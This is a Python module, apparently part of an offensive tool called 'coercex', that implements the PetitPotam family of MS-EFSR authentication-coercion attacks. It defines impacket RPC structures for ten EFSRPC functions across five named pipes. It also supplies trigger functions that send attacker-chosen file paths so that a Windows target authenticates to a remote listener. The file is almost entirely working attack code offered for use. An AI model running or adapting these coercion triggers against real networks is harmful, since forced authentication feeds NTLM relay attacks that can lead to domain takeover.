"""MS-EFSR (Encrypting File System Remote Protocol) coercion methods.

10 methods across 5 named pipes and 2 interface UUIDs.
This is the PetitPotam family of attacks.
"""

from __future__ import annotations

from impacket.dcerpc.v5.dtypes import BOOL, DWORD, LONG, PCHAR, ULONG, WSTR
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT

from coercex.methods.base import CoercionMethod, PipeBinding

EFSR_UUID_1 = "df1941c5-fe89-4e79-bf10-463657acf44d"  # \PIPE\efsrpc
EFSR_UUID_2 = "c681d488-d850-11d0-8c52-00c04fd90f7e"  # \PIPE\lsarpc etc.

EFSR_PIPES = [
    PipeBinding(pipe=r"\PIPE\efsrpc", uuid=EFSR_UUID_1, version="1.0"),
    PipeBinding(pipe=r"\PIPE\lsarpc", uuid=EFSR_UUID_2, version="1.0"),
    PipeBinding(pipe=r"\PIPE\samr", uuid=EFSR_UUID_2, version="1.0"),
    PipeBinding(pipe=r"\PIPE\lsass", uuid=EFSR_UUID_2, version="1.0"),
    PipeBinding(pipe=r"\PIPE\netlogon", uuid=EFSR_UUID_2, version="1.0"),
]

EFSR_PATH_STYLES = [
    ("smb", "share_file"),
    ("smb", "share_trailing"),
    ("smb", "share"),
    ("http", "share_file"),
]

PROTOCOL_SHORT = "MS-EFSR"
PROTOCOL_LONG = "[MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol"


class _EfsRpcOpenFileRaw(NDRCALL):
    opnum = 0
    structure = (
        ("FileName", WSTR),
        ("Flags", LONG),
    )


class _EfsRpcEncryptFileSrv(NDRCALL):
    opnum = 4
    structure = (("FileName", WSTR),)


class _EfsRpcDecryptFileSrv(NDRCALL):
    opnum = 5
    structure = (
        ("FileName", WSTR),
        ("OpenFlag", ULONG),
    )


class _EfsRpcQueryUsersOnFile(NDRCALL):
    opnum = 6
    structure = (("FileName", WSTR),)


class _EfsRpcQueryRecoveryAgents(NDRCALL):
    opnum = 7
    structure = (("FileName", WSTR),)


class _EfsRpcRemoveUsersFromFile(NDRCALL):
    opnum = 8
    structure = (("FileName", WSTR),)


class _EfsRpcAddUsersToFile(NDRCALL):
    opnum = 9
    structure = (("FileName", WSTR),)


class _EfsRpcFileKeyInfo(NDRCALL):
    opnum = 12
    structure = (
        ("FileName", WSTR),
        ("InfoClass", DWORD),
    )


class EFS_RPC_BLOB(NDRSTRUCT):
    structure = (
        ("Data", DWORD),
        ("cbData", PCHAR),
    )


class _EfsRpcDuplicateEncryptionInfoFile(NDRCALL):
    opnum = 13
    structure = (
        ("SrcFileName", WSTR),
        ("DestFileName", WSTR),
        ("dwCreationDisposition", DWORD),
        ("dwAttributes", DWORD),
        ("RelativeSD", EFS_RPC_BLOB),
        ("bInheritHandle", BOOL),
    )


class _EfsRpcAddUsersToFileEx(NDRCALL):
    opnum = 15
    structure = (
        ("dwFlags", DWORD),
        ("Reserved", DWORD),  # Must be NULL (0)
        ("FileName", WSTR),
    )


def _trigger_open_file_raw(dce, path, target):
    request = _EfsRpcOpenFileRaw()
    request["FileName"] = path
    request["Flags"] = 0
    dce.request(request)


def _trigger_encrypt_file_srv(dce, path, target):
    request = _EfsRpcEncryptFileSrv()
    request["FileName"] = path
    dce.request(request)


def _trigger_decrypt_file_srv(dce, path, target):
    request = _EfsRpcDecryptFileSrv()
    request["FileName"] = path
    request["OpenFlag"] = 0
    dce.request(request)


def _trigger_query_users_on_file(dce, path, target):
    request = _EfsRpcQueryUsersOnFile()
    request["FileName"] = path
    dce.request(request)


def _trigger_query_recovery_agents(dce, path, target):
    request = _EfsRpcQueryRecoveryAgents()
    request["FileName"] = path
    dce.request(request)


def _trigger_remove_users_from_file(dce, path, target):
    request = _EfsRpcRemoveUsersFromFile()
    request["FileName"] = path
    dce.request(request)


def _trigger_add_users_to_file(dce, path, target):
    request = _EfsRpcAddUsersToFile()
    request["FileName"] = path
    dce.request(request)


def _trigger_file_key_info(dce, path, target):
    request = _EfsRpcFileKeyInfo()
    request["FileName"] = path
    request["InfoClass"] = 0
    dce.request(request)


def _trigger_duplicate_encryption_info(dce, path, target):
    request = _EfsRpcDuplicateEncryptionInfoFile()
    request["SrcFileName"] = path
    request["DestFileName"] = path
    request["dwCreationDisposition"] = 0
    request["dwAttributes"] = 0
    request["RelativeSD"] = EFS_RPC_BLOB()
    request["bInheritHandle"] = 0
    dce.request(request)


def _trigger_add_users_to_file_ex(dce, path, target):
    EFSRPC_ADDUSERFLAG_ADD_POLICY_KEYTYPE = 0x00000002
    request = _EfsRpcAddUsersToFileEx()
    request["dwFlags"] = EFSRPC_ADDUSERFLAG_ADD_POLICY_KEYTYPE
    request["Reserved"] = 0
    request["FileName"] = path
    dce.request(request)


def get_methods() -> list[CoercionMethod]:
    """Return all MS-EFSR coercion methods."""
    methods_spec = [
        ("EfsRpcOpenFileRaw", 0, ["FileName"], _trigger_open_file_raw),
        ("EfsRpcEncryptFileSrv", 4, ["FileName"], _trigger_encrypt_file_srv),
        ("EfsRpcDecryptFileSrv", 5, ["FileName"], _trigger_decrypt_file_srv),
        ("EfsRpcQueryUsersOnFile", 6, ["FileName"], _trigger_query_users_on_file),
        ("EfsRpcQueryRecoveryAgents", 7, ["FileName"], _trigger_query_recovery_agents),
        ("EfsRpcRemoveUsersFromFile", 8, ["FileName"], _trigger_remove_users_from_file),
        ("EfsRpcAddUsersToFile", 9, ["FileName"], _trigger_add_users_to_file),
        ("EfsRpcFileKeyInfo", 12, ["FileName"], _trigger_file_key_info),
        (
            "EfsRpcDuplicateEncryptionInfoFile",
            13,
            ["SrcFileName"],
            _trigger_duplicate_encryption_info,
        ),
        ("EfsRpcAddUsersToFileEx", 15, ["FileName"], _trigger_add_users_to_file_ex),
    ]

    methods = []
    for name, opnum, vuln_args, trigger_fn in methods_spec:
        methods.append(
            CoercionMethod(
                protocol_short=PROTOCOL_SHORT,
                protocol_long=PROTOCOL_LONG,
                function_name=name,
                opnum=opnum,
                vuln_args=vuln_args,
                pipe_bindings=list(EFSR_PIPES),
                path_styles=list(EFSR_PATH_STYLES),
                trigger_fn=trigger_fn,
            )
        )
    return methods
